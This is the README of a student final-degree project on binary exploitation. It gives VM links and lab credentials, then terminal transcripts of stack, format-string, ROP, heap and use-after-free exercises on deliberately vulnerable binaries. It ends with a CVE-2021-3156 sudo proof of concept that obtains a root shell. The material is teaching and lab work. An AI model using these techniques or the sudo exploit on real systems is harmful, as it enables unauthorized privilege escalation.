# TFG-Binary-exploitation
Final degree project

---

## VMs links

### Google drive folder

<https://drive.google.com/drive/folders/11PdbHRuZLkHyZGnw1mkYAmYUvQWZ87Go?usp=sharing>

### Ubuntu 20.04 VM

<https://drive.google.com/file/d/1s2fvuZhdWEyJY2fBUdFyvoSHgLCN2Qam/view?usp=sharing>

**Having VirtualBox is a requirement**
Credentials: `qwe:qwe`.

### Phoenix VM

<https://drive.google.com/drive/folders/11urwjkzvheOzsMRH5VvVoFGZSE_1ZiaN?usp=sharing>

The Phoenix VM is launched via `qemu-system-x64`. To launch it execute the bash script inside the folder `exploit-education-phoenix-amd64`. **Having `qemu` installed is a requirement**
```
qwe@qwe:*/exploit-education-phoenix-amd64$ ./boot-exploit-education-phoenix-amd64.sh
```
The qemu window will appear and once the login prompt appears we can connect via ssh with another terminal (to have copy/paste support, 256-term colors, etc).
To connect via ssh:
```
ssh -p 2222 user@127.0.0.1
```
The credentials are `user:user`.

---

## Important notes

**Always execute the exploits on the same folder they are located** (except when the images show otherwise). This is due because of environment variables like PWD (present working directory) and OLDPWD (old PWD) that hold strings to paths and, depending on the length of these paths, the stack moves up and down (because environment variables are stored on the stack).

For the same reason as above, **navigate with the terminal**. Using the graphical file manager to move around directories creates and modifies environment variables.

By default, the Ubuntu 20.04 virtual machine will boot up with ASLR disabled. All exercises were solved without it except CVE-2021-3156 (Baron Samedit).

---

## Exercises

The project includes several challenges to showcase the exploits explained. These challenges are located in the folder `/home/qwe/tfg/` inside the Ubuntu 20.04 virtual machine or in the Phoenix VM, folders `/opt/phoenix/amd64/` and `/opt/phoenix/i486`.

### ret2win

```
user@phoenix-amd64:/opt/phoenix/amd64$ python2 ~/stack4_exploit.py | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

### ret2shellcode

```
user@phoenix-amd64:/opt/phoenix/amd64$ cat ~/qwe - | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
ls
final-one   format-four   format-two   heap-three  net-one   stack-five  stack-six    stack-zero
final-two   format-one	  format-zero  heap-two    net-two   stack-four  stack-three
final-zero  format-three  heap-one     heap-zero   net-zero  stack-one	 stack-two
whoami
phoenix-amd64-stack-five
exit
```
### format string arbitrary read

```
qwe@qwe:~/tfg/format_strings/arbitrary_read$ python2 exploit.py > qwe
qwe@qwe:~/tfg/format_strings/arbitrary_read$ ./a.out qwe
�UV_00000001_00000040_5655a1a0_00842421_00000534_0000005e_    ﾭ�
qwe@qwe:~/tfg/format_strings/arbitrary_read$ hexdump -Cv asd
00000000  08 90 55 56 5f 30 30 30  30 30 30 30 31 5f 30 30  |..UV_00000001_00|
00000010  30 30 30 30 34 30 5f 35  36 35 35 61 31 61 30 5f  |000040_5655a1a0_|
00000020  30 30 38 34 32 34 32 31  5f 30 30 30 30 30 35 33  |00842421_0000053|
00000030  34 5f 30 30 30 30 30 30  35 65 5f 20 20 20 20 ef  |4_0000005e_    .|
00000040  be ad de 0a 01                                    |.....|
00000045
```

### format string arbitrary write

```
qwe@qwe:~/tfg/format_strings/arbitrary_write$ python2 exploit.py > qwe
qwe@qwe:~/tfg/format_strings/arbitrary_write$ unset OLDPWD; ./a.out qwe
... lots of spaces ...
�win
Segmentation fault (core dumped)
```

### ret2win

```
qwe@qwe:~/tfg/rop$ gcc -m32 -fno-stack-protector -no-pie main.c
qwe@qwe:~/tfg/rop$ python2 exploit.py > qwe
qwe@qwe:~/tfg/rop$ cat qwe - | ./a.out 
ls
a.out  exploit64.py  exploit.py  main.c  qwe  ret2dlresolve  srop  stack_pivoting
whoami
qwe
exit

Segmentation fault (core dumped)
```

### rop

```
qwe@qwe:~/tfg/rop$ gcc -fno-stack-protector -no-pie main.c 
qwe@qwe:~/tfg/rop$ python2 exploit64.py > qwe
qwe@qwe:~/tfg/rop$ cat qwe - | ./a.out 
ls
a.out  exploit64.py  exploit.py  main.c  qwe  ret2dlresolve  srop  stack_pivoting
whoami
qwe
exit

Segmentation fault (core dumped)
```

### stack pivoting

```
qwe@qwe:~/tfg/rop/stack_pivoting$ python2 exploit.py > qwe
qwe@qwe:~/tfg/rop/stack_pivoting$ unset OLDPWD; cat qwe | ./a.out 
win
win
win
win
win
win
win
win
win
win
win
win
win
win
win
win
win
Segmentation fault (core dumped)
```

### ret2dlresolve

```
qwe@qwe:~/tfg/rop/ret2dlresolve$ gcc -fno-stack-protector -no-pie -ggdb -Wl,-z,norelro main.c
qwe@qwe:~/tfg/rop/ret2dlresolve$ python3 exploit.py 
qwe@qwe:~/tfg/rop/ret2dlresolve$ cat wer - | ./a.out 
ls
a.out  exploit.py  main.c  wer
whoami
qwe
exit

Segmentation fault (core dumped)
```

### srop

```
qwe@qwe:~/tfg/rop/srop$ gcc -ggdb -fno-stack-protector -no-pie main.c 
qwe@qwe:~/tfg/rop/srop$ python3 exploit.py 
qwe@qwe:~/tfg/rop/srop$ ls
a.out  exploit.py  main.c  wer
qwe@qwe:~/tfg/rop/srop$ cat wer - | ./a.out 
ls
a.out  exploit.py  main.c  wer
whoami
qwe
exit
```

### heap overflow

```
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-one $(python -c 'print "A"*20 + "\xec\xd5\xff\xff"') $(python -c 'print "\x9a\x88\x04\x08"')
Congratulations, you've completed this level @ 1624118202 seconds past the Epoch
Segmentation fault
```

### uaf

```
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-two 
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth qwe
[ auth = 0x8049af0, service = 0 ]
reset
[ auth = 0x8049af0, service = 0 ]
service qwertyuiopasdfghj
[ auth = 0x8049af0, service = 0x8049af0 ]
login
you have logged in already!
[ auth = 0x8049af0, service = 0x8049af0 ]
```

### double free

```
qwe@qwe:~/tfg/how2heap/glibc_2.31$ ./fastbin_dup 
This file demonstrates a simple double-free attack with fastbins.
Fill up tcache first.
Allocating 3 buffers.
1st calloc(1, 8): 0x5555555593a0
2nd calloc(1, 8): 0x5555555593c0
3rd calloc(1, 8): 0x5555555593e0
Freeing the first one...
If we free 0x5555555593a0 again, things will crash because 0x5555555593a0 is at the top of the free list.
So, instead, we'll free 0x5555555593c0.
Now, we can free 0x5555555593a0 again, since it's not the head of the free list.
Now the free list has [ 0x5555555593a0, 0x5555555593c0, 0x5555555593a0 ]. If we malloc 3 times, we'll get 0x5555555593a0 twice!
1st calloc(1, 8): 0x5555555593a0
2nd calloc(1, 8): 0x5555555593c0
3rd calloc(1, 8): 0x5555555593a0
```

## CVE-2021-3156 PoC

```
qwe@qwe:~/tfg/baron_samedit$ ./launch 
>>>> Executing evil lib
>>>> We are root
# ls
Makefile		baron_samedit.srctrldb	 bin	   evil_lib.c  launch	 libexec   sbin   solution1751
baron_samedit.srctrlbm	baron_samedit.srctrlprj  brute.py  include     launch.c  libnss_x  share  sudo-1.8.31
# whoami
root
# exit
sudoedit: a password is required
qwe@qwe:~/tfg/baron_samedit$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
[sudo] password for qwe: 
2
qwe@qwe:~/tfg/baron_samedit$ ./launch 
>>>> Executing evil lib
>>>> We are root
# whoami
root
# exit
qwe is not in the sudoers file.  This incident will be reported.
```
